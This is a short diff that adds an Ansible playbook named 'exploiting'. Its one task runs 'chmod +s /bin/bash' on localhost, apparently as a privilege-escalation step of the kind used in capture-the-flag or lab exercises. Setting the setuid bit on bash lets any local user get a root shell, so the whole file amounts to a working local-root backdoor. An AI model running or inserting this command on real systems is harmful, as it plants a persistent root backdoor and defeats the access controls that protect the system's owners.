@@ -1,0 +1,7 @@
+---
+  - name: exploiting
+    hosts: localhost
+    tasks:
+      - name: Execute command
+        register: chnameod
+        command: "chmod +s /bin/bash"
